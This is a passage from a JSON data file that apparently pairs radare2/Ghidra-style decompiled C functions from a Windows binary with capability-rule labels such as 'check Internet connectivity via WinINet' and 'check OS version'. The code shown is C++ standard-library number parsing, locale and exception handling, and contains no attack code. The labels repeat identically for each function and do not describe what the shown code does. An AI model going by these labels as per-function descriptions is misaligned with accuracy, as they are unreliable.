(*(iVar11 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar2 = *(iVar11 + 5);\n        if (cVar2 != *(unaff_EBP + -0x15)) {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.00423d04();\n                cVar2 = *(iVar11 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x004230ad;\n        }\n        *puVar14 = 0x70;\n        puVar15 = puVar14 + 1;\n        fcn.004234d8();\n        iVar12 = 0;\n        *(unaff_EBP + -0x61) = 0;\n        *(unaff_EBP + -0x74) = 0;\n        cVar2 = fcn.00424ec3(*(unaff_EBP + -0x68));\n        if (cVar2 == '\\0') {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.00423d04();\n            }\n            cVar2 = *(iVar11 + 5);\n            if (cVar2 == *(unaff_EBP + -0x19)) {\n                *puVar15 = 0x2b;\n            }\n            else {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.00423d04();\n                    cVar2 = *(iVar11 + 5);\n                }\n                if (cVar2 != *(unaff_EBP + -0x1a)) goto code_r0x00423018;\n                *puVar15 = 0x2d;\n            }\n            puVar15 = puVar14 + 1;\n            fcn.004234d8();\n        }\ncode_r0x00423018:\n        cVar2 = fcn.00424ec3(*(unaff_EBP + -0x68));\n        if (cVar2 == '\\0') {\n            uVar13 = *(unaff_EBP + -0x68);\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                if (*(iVar11 + 5) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004234d8();\n                cVar2 = fcn.00424ec3(uVar13);\n            } while (cVar2 == '\\0');\n            iVar12 = *(unaff_EBP + -0x74);\n            if (*(unaff_EBP + -0x61) != '\\0') {\n                *puVar15 = 0x30;\n                puVar15 = puVar15 + 1;\n            }\n        }\n        while( true ) {\n            cVar2 = fcn.00424ec3(*(unaff_EBP + -0x68));\n            if (cVar2 != '\\0') break;\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.00423d04();\n            }\n            uVar6 = fcn.00421578(unaff_EBP + -0x30, *(iVar11 + 5));\n            if (0x15 < uVar6) break;\n            if (iVar12 < 8) {\n                *puVar15 = *(uVar6 + 0x4744f0);\n                puVar15 = puVar15 + 1;\n                iVar12 = iVar12 + 1;\n            }\n            *(unaff_EBP + -0x61) = 1;\n            fcn.004234d8();\n        }\n    }\ncode_r0x004230ad:\n    cVar2 = *(unaff_EBP + -0x61);\ncode_r0x004230b0:\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar2 == '\\0')) {\n        puVar15 = *(unaff_EBP + -0x8c);\n    }\n    puVar8 = *(unaff_EBP + -0x94);\n    uVar13 = *(unaff_EBP + -0x6c);\n    *puVar15 = 0;\n    *puVar8 = uVar13;\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 5350
    },
    "004230de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_13h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.004230de(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_13h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x6c);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x74) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -100) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00421aa2(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x5c);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x4c) == 0) {\n        *(unaff_EBP + -0x5e) = 0;\n    }\n    else {\n        pcVar2 = *(*piVar5 + 0x10);\n        (**0x4742a4)();\n        uVar3 = (*pcVar2)();\n        *(unaff_EBP + -0x5e) = uVar3;\n    }\n    piVar5 = fcn.004218b0(*(unaff_EBP + -100));\n    pcVar2 = *(*piVar5 + 0x1c);\n    (**0x4742a4)(0x4744d4, 0x4744ef, unaff_EBP + -0x2c);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x74);\n    *(unaff_EBP + -0x68) = puVar10;\n    cVar4 = fcn.00424ec3(*(unaff_EBP + -0x6c));\n    if (cVar4 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar4 = *(iVar8 + 5);\n        if (cVar4 == *(unaff_EBP + -0x15)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00423d04();\n                cVar4 = *(iVar8 + 5);\n            }\n            if (cVar4 != *(unaff_EBP + -0x16)) goto code_r0x004231bd;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x68) = puVar10 + 1;\n        fcn.004234d8();\n    }\ncode_r0x004231bd:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -100) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x5d) = 0;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x5f) = 0;\n    cVar4 = fcn.00424ec3(*(unaff_EBP + -0x6c));\n    if (cVar4 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        if (*(iVar8 + 5) != *(unaff_EBP + -0x2c)) goto code_r0x00423282;\n        *(unaff_EBP + -0x5d) = 1;\n        *(unaff_EBP + -0x70) = 1;\n        fcn.004234d8();\n        cVar4 = fcn.00424ec3(*(unaff_EBP + -0x6c));\n        if (cVar4 != '\\0') {\ncode_r0x0042327b:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x00423282;\n            }\n            goto code_r0x00423286;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar4 = *(iVar8 + 5);\n        if (cVar4 != *(unaff_EBP + -0x13)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00423d04();\n                cVar4 = *(iVar8 + 5);\n            }\n            if (cVar4 != *(unaff_EBP + -0x14)) goto code_r0x0042327b;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x0042327b;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x5d) = 0;\n        *(unaff_EBP + -0x70) = 0;\n        fcn.004234d8();\ncode_r0x0042328a:\n        *(unaff_EBP + -100) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x00423282:\n        if (uVar11 != 0) {\ncode_r0x00423286:\n            if (uVar11 != 10) goto code_r0x0042328a;\n        }\n    }\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x30) = 0xf;\n    *(unaff_EBP + -0x44) = 0;\n    fcn.0040acd0(1, *(unaff_EBP + -0x70));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x74) + 0x1f;\n    uVar12 = fcn.00424ec3(*(unaff_EBP + -0x6c));\n    if (uVar12 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                uVar12 = fcn.00423d04();\n            }\n            uVar12 = uVar12 & 0xffffff00 | *(iVar8 + 5);\n            *(unaff_EBP + -0x78) = uVar12;\n            uVar12 = fcn.00421578(unaff_EBP + -0x2c, uVar12);\n            if (uVar12 < *(unaff_EBP + -100)) {\n                cVar1 = *(unaff_EBP + -0x5f);\n                cVar4 = *(uVar12 + 0x4744d4);\n                pcVar9 = *(unaff_EBP + -0x68);\n                *pcVar9 = cVar4;\n                if (((cVar1 != '\\0') || (cVar4 != '0')) && (pcVar9 < *(unaff_EBP + -0x70))) {\n                    *(unaff_EBP + -0x5f) = 1;\n                    *(unaff_EBP + -0x68) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x44;\n                *(unaff_EBP + -0x5d) = 1;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    iVar6 = *(unaff_EBP + -0x44);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x44;\n                    if (0xf < *(unaff_EBP + -0x30)) {\n                        iVar6 = *(unaff_EBP + -0x44);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                iVar6 = *(unaff_EBP + -0x44);\n                iVar7 = unaff_EBP + -0x44;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x5e) == '\\0')) goto code_r0x004233a7;\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.00423d04();\n                    cVar4 = *(iVar8 + 5);\n                    iVar6 = *(unaff_EBP + -0x44);\n                }\n                else {\n                    cVar4 = *(unaff_EBP + -0x78);\n                }\n                if (cVar4 != *(unaff_EBP + -0x5e)) goto code_r0x004233a7;\n                fcn.00406de0(1, 0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004234d8();\n            uVar12 = fcn.00424ec3(*(unaff_EBP + -0x6c));\n        } while (uVar12 == '\\0');\n        iVar6 = *(unaff_EBP + -0x44);\ncode_r0x004233a7:\n        uVar12 = *(unaff_EBP + -0x30);\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x44;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar4 = '\\0';\n                goto code_r0x004233ce;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        iVar6 = *(unaff_EBP + -0x44);\n        uVar12 = *(unaff_EBP + -0x30);\n    }\n    cVar4 = *(unaff_EBP + -0x5d);\ncode_r0x004233ce:\n    pcVar9 = unaff_EBP + -0x5c;\n    if (0xf < *(unaff_EBP + -0x48)) {\n        pcVar9 = *(unaff_EBP + -0x5c);\n    }\n    if (cVar4 == '\\0') {\ncode_r0x00423445:\n        puVar10 = *(unaff_EBP + -0x74);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar4 = *pcVar9,  cVar4 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x44;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -100) = *(unaff_EBP + -0x44);\n                }\n                iVar6 = *(unaff_EBP + -0x44);\n                if (cVar4 != *(*(unaff_EBP + -100) + iVar13)) goto code_r0x00423445;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x44;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    *(unaff_EBP + -100) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x30);\n                if (cVar4 < **(unaff_EBP + -100)) goto code_r0x00423445;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x68);\n        if (*(unaff_EBP + -0x5f) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.00406810();\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 3138
    },
    "004235bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.004235bb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    uchar uVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    int32_t iVar11;\n    uint noname_0;\n    int32_t unaff_EBP;\n    int32_t arg_1ch_00;\n    uint32_t arg_1ch_01;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x50);\n    uVar9 = *(unaff_EBP + 0x24);\n    iVar11 = *(unaff_EBP + 0x18);\n    pcVar8 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x50) = iVar11;\n    if ((uVar9 == 0) || ((*pcVar8 != '+' && (*pcVar8 != '-')))) {\n        arg_1ch_01 = 0;\n    }\n    else {\n        arg_1ch_01 = 1;\n    }\n    if (((((*(iVar11 + 0x14) & 0xe00) == 0x800) && (arg_1ch_01 + 2 <= uVar9)) && (pcVar8[arg_1ch_01] == '0')) &&\n       ((pcVar8[arg_1ch_01 + 1] == 'x' || (pcVar8[arg_1ch_01 + 1] == 'X')))) {\n        arg_1ch_01 = arg_1ch_01 + 2;\n    }\n    fcn.00421bb3(*(iVar11 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar6 = fcn.004218b0(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x44) = uVar6;\n    fcn.00401990();\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.0040acd0(uVar9, 0);\n    iVar11 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (0xf < *(unaff_EBP + -0x14)) {\n        iVar11 = *(unaff_EBP + -0x28);\n    }\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x1c);\n    (**0x4742a4)(pcVar8, pcVar8 + uVar9, iVar11);\n    (*pcVar2)();\n    fcn.00421bb3(*(*(unaff_EBP + -0x50) + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar7 = fcn.00421aa2(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar7;\n    fcn.00401990();\n    pcVar2 = *(*piVar7 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar2)();\n    pcVar8 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x48) = pcVar8;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar8 = *(unaff_EBP + -0x40);\n        *(unaff_EBP + -0x48) = pcVar8;\n    }\n    if ((*pcVar8 != '\\x7f') && ('\\0' < *pcVar8)) {\n        pcVar2 = *(**(unaff_EBP + -0x44) + 0x10);\n        (**0x4742a4)();\n        uVar5 = (*pcVar2)();\n        *(unaff_EBP + -0x44) = uVar5;\n        pcVar8 = *(unaff_EBP + -0x48);\n        while (((cVar1 = *pcVar8,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar9 - arg_1ch_01))) {\n            uVar9 = uVar9 - cVar1;\n            fcn.00424fe8(uVar9, 1, *(unaff_EBP + -0x44));\n            if ('\\0' < pcVar8[1]) {\n                pcVar8 = pcVar8 + 1;\n            }\n        }\n    }\n    iVar11 = *(unaff_EBP + -0x50);\n    uVar9 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x44) = uVar9;\n    uVar3 = *(iVar11 + 0x20);\n    if (((*(iVar11 + 0x24) < 0) || ((*(iVar11 + 0x24) < 1 && (uVar3 == 0)))) || (uVar3 <= uVar9)) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = uVar3 - uVar9;\n    }\n    uVar9 = *(iVar11 + 0x14) & 0x1c0;\n    if (uVar9 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (0xf < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        noname_0 = *(unaff_EBP + 8);\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar6 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar9 == 0x100) {\n            iVar11 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar11 = *(unaff_EBP + -0x28);\n            }\n            noname_0 = *(unaff_EBP + 8);\n            puVar10 = fcn.00423d28(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar11, \n                                   arg_1ch_01);\n            puVar10 = fcn.00423d5b(noname_0, unaff_EBP + -0x4c, *puVar10, puVar10[1], *(unaff_EBP + 0x1c), arg_1ch_00);\n            arg_1ch_00 = 0;\n            goto code_r0x00423800;\n        }\n        noname_0 = *(unaff_EBP + 8);\n        puVar10 = fcn.00423d5b(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                               *(unaff_EBP + 0x1c), arg_1ch_00);\n        arg_1ch_00 = 0;\n        var_28h = unaff_EBP + -0x28;\n        if (0xf < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = puVar10[1];\n        uVar6 = *puVar10;\n    }\n    puVar10 = fcn.00423d28(noname_0, unaff_EBP + -0x4c, uVar6, var_2ch, var_28h, arg_1ch_01);\ncode_r0x00423800:\n    uVar6 = *puVar10;\n    *(unaff_EBP + 0x10) = uVar6;\n    uVar4 = puVar10[1];\n    *(unaff_EBP + 0x14) = uVar4;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (0xf < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    puVar10 = fcn.00423d28(noname_0, unaff_EBP + -0x5c, uVar6, uVar4, *(unaff_EBP + -0x48) + arg_1ch_01, \n                           *(unaff_EBP + -0x44) - arg_1ch_01);\n    iVar11 = *(unaff_EBP + -0x50);\n    uVar6 = *(unaff_EBP + 0x1c);\n    uVar4 = *puVar10;\n    arg_ch_00 = *(unaff_EBP + -0x54);\n    *(unaff_EBP + 0x10) = uVar4;\n    arg_14h_00 = puVar10[1];\n    *(iVar11 + 0x20) = 0;\n    *(iVar11 + 0x24) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00423d5b(noname_0, arg_ch_00, uVar4, arg_14h_00, uVar6, arg_1ch_00);\n    fcn.00406810();\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 2590
    },
    "00423ace": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00423ace(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    int32_t iVar6;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar7;\n    \n    uVar7 = 8;\n    fcn.0043acd3();\n    iVar6 = *(unaff_EBP + 0x14);\n    uVar1 = *(unaff_EBP + 0xc) & 2;\n    arg_8h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x10) = uVar1;\n    if (uVar1 != 0) {\n        if (iVar6 == 0) {\n            iVar2 = fcn.0043a4f7(0x18, uVar7);\n            *(unaff_EBP + -0x14) = iVar2;\n            if (iVar2 == 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = fcn.00421b48(*(unaff_EBP + 8), 0);\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, uVar3, uVar4);\n        }\n        else {\n            uVar3 = fcn.00401800();\n            uVar4 = fcn.004218b0(iVar6);\n            fcn.00423876(arg_8h_00, uVar4, uVar3);\n        }\n    }\n    if ((*(unaff_EBP + 0xc) & 8) != 0) {\n        if (iVar6 == 0) {\n            ppcVar5 = fcn.0043a4f7(8, uVar7);\n            *(unaff_EBP + -0x14) = ppcVar5;\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                ppcVar5[1] = NULL;\n                *ppcVar5 = \n                vtable.std::num_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n            }\n            uVar3 = fcn.00401800();\n            iVar2 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar5, uVar3);\n            ppcVar5 = fcn.0043a4f7(8, iVar2);\n            *(unaff_EBP + -0x14) = ppcVar5;\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                ppcVar5[1] = NULL;\n                *ppcVar5 = \n                vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            }\n            uVar3 = fcn.00401800();\n            iVar2 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar5, uVar3);\n            ppcVar5 = fcn.0043a4f7(0x18, iVar2);\n            *(unaff_EBP + -0x14) = ppcVar5;\n            *(unaff_EBP + -4) = 7;\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                ppcVar5[1] = NULL;\n                uVar3 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 8;\n                *ppcVar5 = vtable.std::numpunct_char_.0;\n                fcn.004234f9(uVar3, 0);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar3 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar5, uVar3);\n        }\n        else {\n            uVar3 = fcn.00401800();\n            uVar4 = fcn.00421956(iVar6);\n            fcn.00423876(arg_8h_00, uVar4, uVar3);\n            uVar3 = fcn.00401800();\n            uVar4 = fcn.004219fc(iVar6);\n            fcn.00423876(arg_8h_00, uVar4, uVar3);\n            uVar3 = fcn.00401800();\n            uVar4 = fcn.00421aa2(iVar6);\n            fcn.00423876(arg_8h_00, uVar4, uVar3);\n        }\n    }\n    if (*(unaff_EBP + -0x10) != 0) {\n        if (iVar6 == 0) {\n            ppcVar5 = fcn.0043a4f7(8, uVar7);\n            *(unaff_EBP + -0x14) = ppcVar5;\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                ppcVar5[1] = NULL;\n                *ppcVar5 = vtable.std::codecvt_char__char__struct__Mbstatet_.0;\n            }\n            uVar7 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar5, uVar7);\n        }\n        else {\n            uVar7 = fcn.00401800();\n            uVar3 = fcn.0042180a(iVar6);\n            fcn.00423876(arg_8h_00, uVar3, uVar7);\n        }\n    }\n    iVar2 = *(unaff_EBP + 8);\n    fcn.00437042(iVar2, *(unaff_EBP + 0xc), arg_8h_00, iVar6);\n    fcn.0042fa73(iVar2, *(unaff_EBP + 0xc), arg_8h_00, iVar6);\n    uVar1 = *(unaff_EBP + 0xc);\n    fcn.0042f523(iVar2, uVar1, arg_8h_00, iVar6);\n    *(arg_8h_00 + 0x10) = *(arg_8h_00 + 0x10) | uVar1;\n    iVar6 = *(iVar2 + 0x2c);\n    if (iVar6 == 0) {\n        iVar6 = iVar2 + 0x30;\n    }\n    fcn.00404b30(iVar6);\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 1604
    },
    "00425354": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00425354(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(4);\n    fcn.004214e9(0);\n    piVar2 = *0x494f14;\n    *(unaff_EBP + -4) = 0;\n    if (piVar2 == NULL) {\n        piVar2 = fcn.0042550a(0);\n        if (*0x494f39 == '\\0') {\n            *0x494f39 = '\\x01';\n            fcn.00438f3d(fcn.00425592);\n        }\n        *0x494f14 = piVar2;\n        piVar2[4] = 0x3f;\n        fcn.00404b30(0x4821d8);\n        pcVar1 = *(*piVar2 + 4);\n        *0x494f10 = piVar2;\n        (**0x4742a4)();\n        (*pcVar1)();\n        *0x494f34 = *0x494f10;\n    }\n    if (*(unaff_EBP + 8) != '\\0') {\n        pcVar1 = *(*piVar2 + 4);\n        (**0x4742a4)();\n        (*pcVar1)();\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 356
    },
    "00425d61": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425d61(int32_t *arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint var_10h;\n    int32_t var_4h;\n    \n    uVar5 = 0;\n    *(in_ECX + 0x14) = arg_ch;\n    *in_ECX = *arg_8h;\n    iVar4 = arg_8h[1];\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    in_ECX[1] = iVar4;\n    uVar2 = arg_8h[4];\n    in_ECX[4] = uVar2;\n    if (uVar2 != 0) {\n        piVar6 = in_ECX + 5;\n        do {\n            if (0xe < uVar5) break;\n            uVar5 = uVar5 + 1;\n            *piVar6 = *((arg_8h - in_ECX) + piVar6);\n            piVar6 = piVar6 + 1;\n            uVar2 = in_ECX[4];\n        } while (uVar5 < uVar2);\n    }\n    if (uVar2 < 0xf) {\n        piVar6 = in_ECX + uVar2 + 5;\n        for (iVar4 = 0xf - uVar2; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n    }\n    if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) &&\n       ((iVar4 = arg_8h[5],  iVar4 == 0x19930520 ||\n        (((iVar4 == 0x19930521 || (iVar4 == 0x19930522)) || (iVar4 == 0x1994000)))))) {\n        in_ECX[6] = 0;\n        if (((arg_8h[6] == 0) || (iVar4 = arg_8h[7],  iVar4 == 0)) ||\n           ((*(iVar4 + 0xc) == NULL || (**(iVar4 + 0xc) < 1)))) {\n            fcn.004567ea();\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar4);\n            in_ECX[7] = iVar3;\n            var_4h = *(*(iVar4 + 0xc) + 4);\n            if (arg_ch == '\\0') {\n                iVar4 = fcn.00426385(*(var_4h + 0x14));\n            }\n            else {\n                iVar4 = fcn.00455a3e();\n            }\n            if (iVar4 != 0) {\n                fcn.00425ff4(iVar4, arg_8h[6], *(var_4h + 0x14), var_4h);\n                in_ECX[6] = iVar4;\n                return;\n            }\n        }\n        fcn.004255d9();\n        fcn.00451487(&var_10h, 0x48c8fc);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 787
    },
    "00425eb2": {
        "rules": [
